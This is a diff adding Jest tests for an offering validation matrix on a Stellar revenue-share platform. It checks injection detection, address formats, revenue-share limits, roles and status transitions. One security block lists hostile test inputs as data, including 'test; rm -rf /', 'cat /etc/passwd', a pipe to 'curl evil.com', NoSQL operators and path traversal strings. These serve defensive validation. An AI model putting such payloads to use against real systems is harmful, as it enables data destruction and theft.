@@ -8,9 +8,15 @@
  * - Technical validation (payload size, duplicates)
  * - Edge cases and error conditions
  * - Performance and abuse scenarios
+ * - Authorization boundaries
+ * - Stellar address validation
+ * - Financial overflow protection
+ * 
+ * @author Stellar Wave Program
+ * @version 1.0.0
  */
 
-import { OfferingValidationMatrix, OfferingValidationContext, ValidationResult } from '../lib/validationMatrix';
+import { OfferingValidationMatrix, OfferingValidationContext, ValidationResult, ValidationError, ValidationWarning } from '../lib/validationMatrix';
 import { User } from '../types';
 
 describe('OfferingValidationMatrix', () => {
@@ -655,6 +661,395 @@ describe('OfferingValidationMatrix', () => {
       const result = await validationMatrix.validateOffering(mockContext);
       
       expect(result.isValid).toBe(false);
+    });
+  });
+
+  describe('Enhanced Security Tests', () => {
+    it('should detect NoSQL injection attempts', async () => {
+      const nosqlAttacks = [
+        '{$where: {name: "admin"}}',
+        '{$ne: null}',
+        '{$gt: ""}',
+        '{$regex: ".*"}',
+        '{$or: [{name: "admin"}]}'
+      ];
+
+      for (const attack of nosqlAttacks) {
+        mockContext.offeringData.token_asset_id = attack;
+        const result = await validationMatrix.validateOffering(mockContext);
+        expect(result.isValid).toBe(false);
+        expect(result.errors.some(e => e.code === 'NOSQL_INJECTION_DETECTED')).toBe(true);
+      }
+    });
+
+    it('should detect command injection attempts', async () => {
+      const commandAttacks = [
+        'test; rm -rf /',
+        'name && cat /etc/passwd',
+        'test | curl evil.com',
+        'name $(whoami)'
+      ];
+
+      for (const attack of commandAttacks) {
+        mockContext.offeringData.name = attack;
+        const result = await validationMatrix.validateOffering(mockContext);
+        expect(result.isValid).toBe(false);
+        expect(result.errors.some(e => e.code === 'COMMAND_INJECTION_DETECTED')).toBe(true);
+      }
+    });
+
+    it('should detect path traversal attempts', async () => {
+      const pathAttacks = [
+        '../../../etc/passwd',
+        '..\\..\\windows\\system32',
+        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
+      ];
+
+      for (const attack of pathAttacks) {
+        mockContext.offeringData.token_asset_id = attack;
+        const result = await validationMatrix.validateOffering(mockContext);
+        expect(result.isValid).toBe(false);
+        expect(result.errors.some(e => e.code === 'PATH_TRAVERSAL_DETECTED')).toBe(true);
+      }
+    });
+
+    it('should detect dangerous characters', async () => {
+      const dangerousInputs = ['test\x00', 'name\x0a', 'data\x0d', 'test\x1a'];
+
+      for (const input of dangerousInputs) {
+        mockContext.offeringData.name = input;
+        const result = await validationMatrix.validateOffering(mockContext);
+        expect(result.isValid).toBe(false);
+        expect(result.errors.some(e => e.code === 'DANGEROUS_CHARACTER_DETECTED')).toBe(true);
+      }
+    });
+  });
+
+  describe('Stellar Address Validation', () => {
+    it('should validate Stellar asset codes', async () => {
+      const validAssetCodes = ['USD', 'USDC', 'BTC', 'ETH', 'TEST123', 'ABCDEFGHIJKL'];
+
+      for (const assetCode of validAssetCodes) {
+        mockContext.offeringData.token_asset_id = assetCode;
+        const result = await validationMatrix.validateOffering(mockContext);
+        expect(result.isValid).toBe(true);
+      }
+    });
+
+    it('should validate Stellar public keys', async () => {
+      const validPublicKeys = [
+        'GABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMN',
+        'GB7NYNSOES7THKZ5CAQJRP5SUA4Q5F2PO4N6G2DVPJ3PGL4K5Z4V6AM'
+      ];
+
+      for (const publicKey of validPublicKeys) {
+        mockContext.offeringData.token_asset_id = publicKey;
+        const result = await validationMatrix.validateOffering(mockContext);
+        expect(result.isValid).toBe(true);
+        expect(result.warnings.some(w => w.code === 'STELLAR_PUBLIC_KEY_FORMAT')).toBe(true);
+      }
+    });
+
+    it('should validate contract addresses', async () => {
+      const validAddresses = [
+        '0x742d35Cc6634C0532925a3b8D4C9db96C4b4Db45',
+        '0x1234567890123456789012345678901234567890'
+      ];
+
+      for (const address of validAddresses) {
+        mockContext.offeringData.token_asset_id = address;
+        const result = await validationMatrix.validateOffering(mockContext);
+        expect(result.isValid).toBe(true);
+        expect(result.warnings.some(w => w.code === 'CONTRACT_ADDRESS_FORMAT')).toBe(true);
+      }
+    });
+
+    it('should reject malformed Stellar addresses', async () => {
+      const invalidAddresses = [
+        'g123', // lowercase
+        'GTOOLONGSTELLARPUBLICKEYTHATEXCEEDSLIMIT12345', // too long
+        'GINVALIDCHARS!@#', // invalid characters
+        'G12345', // too short
+        '0xinvalid', // invalid hex
+        'toolongassetcodeexceedinglimit' // > 12 chars
+      ];
+
+      for (const address of invalidAddresses) {
+        mockContext.offeringData.token_asset_id = address;
+        const result = await validationMatrix.validateOffering(mockContext);
+        expect(result.isValid).toBe(false);
+      }
+    });
+  });
+
+  describe('Financial Overflow Protection', () => {
+    it('should handle revenue share boundary values', async () => {
+      const boundaryValues = [0, 1, 9999, 10000];
+
+      for (const value of boundaryValues) {
+        mockContext.offeringData.revenue_share_bps = value;
+        const result = await validationMatrix.validateOffering(mockContext);
+        expect(result.isValid).toBe(true);
+      }
+    });
+
+    it('should reject negative revenue share', async () => {
+      mockContext.offeringData.revenue_share_bps = -1;
+      const result = await validationMatrix.validateOffering(mockContext);
+      expect(result.isValid).toBe(false);
+      expect(result.errors.some(e => e.code === 'REVENUE_SHARE_NEGATIVE')).toBe(true);
+      expect(result.errors.find(e => e.code === 'REVENUE_SHARE_NEGATIVE')?.severity).toBe('critical');
+    });
+
+    it('should reject revenue share over 100%', async () => {
+      mockContext.offeringData.revenue_share_bps = 10001;
+      const result = await validationMatrix.validateOffering(mockContext);
+      expect(result.isValid).toBe(false);
+      expect(result.errors.some(e => e.code === 'REVENUE_SHARE_OVERFLOW')).toBe(true);
+      expect(result.errors.find(e => e.code === 'REVENUE_SHARE_OVERFLOW')?.severity).toBe('critical');
+    });
+
+    it('should reject non-integer revenue share', async () => {
+      mockContext.offeringData.revenue_share_bps = 1000.5;
+      const result = await validationMatrix.validateOffering(mockContext);
+      expect(result.isValid).toBe(false);
+      expect(result.errors.some(e => e.code === 'REVENUE_SHARE_NOT_INTEGER')).toBe(true);
+    });
+
+    it('should reject NaN and Infinity values', async () => {
+      const invalidValues = [NaN, Infinity, -Infinity];
+
+      for (const value of invalidValues) {
+        mockContext.offeringData.revenue_share_bps = value;
+        const result = await validationMatrix.validateOffering(mockContext);
+        expect(result.isValid).toBe(false);
+        expect(result.errors.some(e => e.code === 'INVALID_REVENUE_SHARE_VALUE')).toBe(true);
+        expect(result.errors.find(e => e.code === 'INVALID_REVENUE_SHARE_VALUE')?.severity).toBe('critical');
+      }
+    });
+
+    it('should warn about high revenue share', async () => {
+      mockContext.offeringData.revenue_share_bps = 6000; // 60%
+      const result = await validationMatrix.validateOffering(mockContext);
+      expect(result.warnings.some(w => w.code === 'HIGH_REVENUE_SHARE')).toBe(true);
+    });
+
+    it('should warn about low revenue share', async () => {
+      mockContext.offeringData.revenue_share_bps = 50; // 0.5%
+      const result = await validationMatrix.validateOffering(mockContext);
+      expect(result.warnings.some(w => w.code === 'LOW_REVENUE_SHARE')).toBe(true);
+    });
+
+    it('should warn about suspicious revenue share values', async () => {
+      const suspiciousValues = [9999, 999, 99, 9];
+
+      for (const value of suspiciousValues) {
+        mockContext.offeringData.revenue_share_bps = value;
+        const result = await validationMatrix.validateOffering(mockContext);
+        expect(result.warnings.some(w => w.code === 'SUSPICIOUS_REVENUE_SHARE')).toBe(true);
+      }
+    });
+  });
+
+  describe('Authorization Tests', () => {
+    it('should reject offering creation by investor', async () => {
+      mockUser.role = 'investor';
+      const result = await validationMatrix.validateOffering(mockContext);
+      expect(result.isValid).toBe(false);
+      expect(result.errors.some(e => e.code === 'INSUFFICIENT_PRIVILEGES')).toBe(true);
+      expect(result.errors.find(e => e.code === 'INSUFFICIENT_PRIVILEGES')?.severity).toBe('critical');
+    });
+
+    it('should reject offering creation by admin', async () => {
+      mockUser.role = 'admin';
+      const result = await validationMatrix.validateOffering(mockContext);
+      expect(result.isValid).toBe(false);
+      expect(result.errors.some(e => e.code === 'INSUFFICIENT_PRIVILEGES')).toBe(true);
+    });
+
+    it('should reject operations without user ID', async () => {
+      mockUser.id = '';
+      const result = await validationMatrix.validateOffering(mockContext);
+      expect(result.isValid).toBe(false);
+      expect(result.errors.some(e => e.code === 'INVALID_USER')).toBe(true);
+      expect(result.errors.find(e => e.code === 'INVALID_USER')?.severity).toBe('critical');
+    });
+  });
+
+  describe('Status Transition Tests', () => {
+    it('should allow valid status transitions', async () => {
+      const validTransitions = [
+        { from: 'draft', to: 'active' },
+        { from: 'draft', to: 'closed' },
+        { from: 'active', to: 'paused' },
+        { from: 'active', to: 'closed' },
+        { from: 'paused', to: 'active' },
+        { from: 'paused', to: 'closed' }
+      ];
+
+      for (const transition of validTransitions) {
+        mockContext.operation = 'status_change';
+        mockContext.offering = { id: 'test', status: transition.from };
+        mockContext.offeringData.status = transition.to;
+        
+        const result = await validationMatrix.validateOffering(mockContext);
+        expect(result.isValid).toBe(true);
+      }
+    });
+
+    it('should reject invalid status transitions', async () => {
+      const invalidTransitions = [
+        { from: 'draft', to: 'paused' },
+        { from: 'active', to: 'draft' },
+        { from: 'paused', to: 'draft' },
+        { from: 'closed', to: 'active' },
+        { from: 'closed', to: 'paused' },
+        { from: 'closed', to: 'draft' }
+      ];
+
+      for (const transition of invalidTransitions) {
+        mockContext.operation = 'status_change';
+        mockContext.offering = { id: 'test', status: transition.from };
+        mockContext.offeringData.status = transition.to;
+        
+        const result = await validationMatrix.validateOffering(mockContext);
+        expect(result.isValid).toBe(false);
+        expect(result.errors.some(e => e.code === 'INVALID_STATUS_TRANSITION')).toBe(true);
+      }
+    });
+  });
+
+  describe('Payload Size Tests', () => {
+    it('should reject extremely large payloads', async () => {
+      mockContext.requestPayload = { data: 'A'.repeat(2 * 1024 * 1024) }; // 2MB
+      const result = await validationMatrix.validateOffering(mockContext);
+      expect(result.isValid).toBe(false);
+      expect(result.errors.some(e => e.code === 'PAYLOAD_TOO_LARGE')).toBe(true);
+    });
+
+    it('should warn about large payloads', async () => {
+      mockContext.requestPayload = { data: 'A'.repeat(900 * 1024) }; // 900KB
+      const result = await validationMatrix.validateOffering(mockContext);
+      expect(result.warnings.some(w => w.code === 'LARGE_PAYLOAD')).toBe(true);
+    });
+  });
+
+  describe('Field Length Tests', () => {
+    it('should reject overly long names', async () => {
+      mockContext.offeringData.name = 'A'.repeat(256);
+      const result = await validationMatrix.validateOffering(mockContext);
+      expect(result.isValid).toBe(false);
+      expect(result.errors.some(e => e.code === 'FIELD_TOO_LONG')).toBe(true);
+    });
+
+    it('should warn about long descriptions', async () => {
+      mockContext.offeringData.description = 'A'.repeat(6000);
+      const result = await validationMatrix.validateOffering(mockContext);
+      expect(result.warnings.some(w => w.code === 'LONG_DESCRIPTION')).toBe(true);
+    });
+
+    it('should reject overly long token asset IDs', async () => {
+      mockContext.offeringData.token_asset_id = 'A'.repeat(256);
+      const result = await validationMatrix.validateOffering(mockContext);
+      expect(result.isValid).toBe(false);
+      expect(result.errors.some(e => e.code === 'TOKEN_ASSET_TOO_LONG')).toBe(true);
+    });
+  });
+
+  describe('Duplicate Detection Tests', () => {
+    it('should detect duplicate offering names', async () => {
+      mockContext.existingOfferings = [
+        { id: 'existing', name: 'Test Offering', issuer_user_id: 'user-123' }
+      ];
+      const result = await validationMatrix.validateOffering(mockContext);
+      expect(result.isValid).toBe(false);
+      expect(result.errors.some(e => e.code === 'DUPLICATE_OFFERING_NAME')).toBe(true);
+    });
+
+    it('should allow same name from different user', async () => {
+      mockContext.existingOfferings = [
+        { id: 'existing', name: 'Test Offering', issuer_user_id: 'different-user' }
+      ];
+      const result = await validationMatrix.validateOffering(mockContext);
+      expect(result.isValid).toBe(true);
+    });
+  });
+
+  describe('Error Handling Tests', () => {
+    it('should handle rule execution errors gracefully', async () => {
+      const faultyMatrix = new OfferingValidationMatrix();
+      faultyMatrix.addRule({
+        name: 'faulty_rule',
+        description: 'A rule that always fails',
+        category: 'technical',
+        priority: 1,
+        isRequired: false,
+        validate: async () => {
+          throw new Error('Rule execution failed');
+        }
+      });
+
+      const result = await faultyMatrix.validateOffering(mockContext);
+      expect(result.errors.some(e => e.code === 'VALIDATION_ENGINE_ERROR')).toBe(true);
+    });
+
+    it('should provide comprehensive metadata', async () => {
+      mockContext.requestPayload.requestId = 'test-123';
+      const result = await validationMatrix.validateOffering(mockContext);
+      
+      expect(result.metadata.timestamp).toBeInstanceOf(Date);
+      expect(result.metadata.validationType).toBe('offering_validation');
+      expect(result.metadata.userId).toBe('user-123');
+      expect(result.metadata.requestId).toBe('test-123');
+      expect(result.metadata.executionTimeMs).toBeGreaterThan(0);
+      expect(result.metadata.rulesApplied.length).toBeGreaterThan(0);
+    });
+  });
+
+  describe('Performance Tests', () => {
+    it('should handle concurrent validations', async () => {
+      const contexts = Array.from({ length: 10 }, (_, i) => ({
+        ...mockContext,
+        requestPayload: { requestId: `test-${i}` },
+        offeringData: {
+          name: `Test Offering ${i}`,
+          token_asset_id: `TEST${i}`
+        }
+      }));
+
+      const startTime = Date.now();
+      const results = await Promise.all(
+        contexts.map(context => validationMatrix.validateOffering(context))
+      );
+      const endTime = Date.now();
+
+      expect(results).toHaveLength(10);
+      expect(results.every(r => r.isValid)).toBe(true);
+      expect(endTime - startTime).toBeLessThan(1000);
+    });
+  });
+
+  describe('Edge Cases', () => {
+    it('should handle minimum valid name length', async () => {
+      mockContext.offeringData.name = 'ABC'; // Exactly 3 chars
+      const result = await validationMatrix.validateOffering(mockContext);
+      expect(result.isValid).toBe(true);
+    });
+
+    it('should handle maximum valid asset code length', async () => {
+      mockContext.offeringData.token_asset_id = 'ABCDEFGHIJKL'; // Exactly 12 chars
+      const result = await validationMatrix.validateOffering(mockContext);
+      expect(result.isValid).toBe(true);
+    });
+
+    it('should handle suspicious token names', async () => {
+      const suspiciousNames = ['admin', 'root', 'system', 'config', 'test'];
+      
+      for (const name of suspiciousNames) {
+        mockContext.offeringData.token_asset_id = name;
+        const result = await validationMatrix.validateOffering(mockContext);
+        expect(result.warnings.some(w => w.code === 'SUSPICIOUS_TOKEN_NAME')).toBe(true);
+      }
     });
   });
 });
